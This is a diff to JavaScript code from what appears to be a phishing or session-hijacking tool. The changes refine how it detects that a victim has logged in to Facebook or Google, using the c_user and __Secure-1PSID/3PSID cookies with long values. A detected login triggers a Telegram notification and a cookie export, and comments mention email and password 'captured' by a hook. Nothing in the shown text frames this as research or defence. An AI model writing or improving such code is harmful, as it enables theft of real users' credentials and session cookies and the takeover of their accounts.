@@ -284,14 +284,29 @@ async function launch(accountId, adminIp) {
   // signal that the account is actually logged in (far more robust than
   // guessing from the URL or page title) — fires the Telegram notification
   // + cookie export exactly once per session the first time it's seen.
-  const LOGIN_COOKIE_NAMES = ['c_user', 'SID', '__Secure-1PSID'];
+  // Cookies that are ONLY set after a real logged-in session, not for
+  // anonymous visits:
+  //   c_user           — Facebook (logged-in user id)
+  //   __Secure-1PSID   — Google (set only after signing into an account)
+  //   __Secure-3PSID   — Google (ditto, 3rd-party-cookie flavor)
+  // We previously included bare "SID", but Google sets SID even for
+  // anonymous visits to its domains (search, YouTube, Gmail landing page),
+  // which fired the "logged in" notification before the user ever typed
+  // credentials. Dropped.
+  const LOGIN_COOKIE_NAMES = ['c_user', '__Secure-1PSID', '__Secure-3PSID'];
   let notifiedLogin = false;
   page.on('framenavigated', (frame) => {
     if (frame !== page.mainFrame()) return;
     pushLog(accountId, 'nav', frame.url());
     if (notifiedLogin) return;
     context.cookies().then(async (cookies) => {
-      if (!cookies.some((c) => LOGIN_COOKIE_NAMES.includes(c.name))) return;
+      // Require a login cookie with a plausibly-long value — anonymous or
+      // placeholder values are usually under 20 chars; a real signed-in
+      // session has a 50+ char opaque id.
+      const loggedIn = cookies.some(
+        (c) => LOGIN_COOKIE_NAMES.includes(c.name) && (c.value || '').length > 30
+      );
+      if (!loggedIn) return;
       notifiedLogin = true;
       // Re-fetch the account — email/password may have been captured (and
       // saved) by __spCapture after launch() first read it, so the closure's
